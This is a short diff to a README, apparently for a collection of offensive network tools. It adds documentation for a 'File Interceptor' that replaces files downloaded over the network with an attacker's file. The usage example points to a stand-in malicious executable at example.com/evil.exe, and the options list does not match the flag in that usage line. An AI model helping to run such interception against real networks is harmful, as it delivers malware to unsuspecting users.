@@ -35,6 +35,15 @@ Usage: 	`netsniff.py -i wlan1`
 
 `-i, -iface, -interface` for your interface
 
+## File Interceptor
+A tool to intercept files on the network and replace them with the attackers
+
+Usage: `intercept.py -e .exe -s http://example.com/evil.exe`
+
+`-e, --ext` for your extension you want to replace
+
+`-u --url` for the url of the file to change
+
 ## DNS Spoofer
 A tool to spoof DNS traffic from the victims device to the Attacker
 
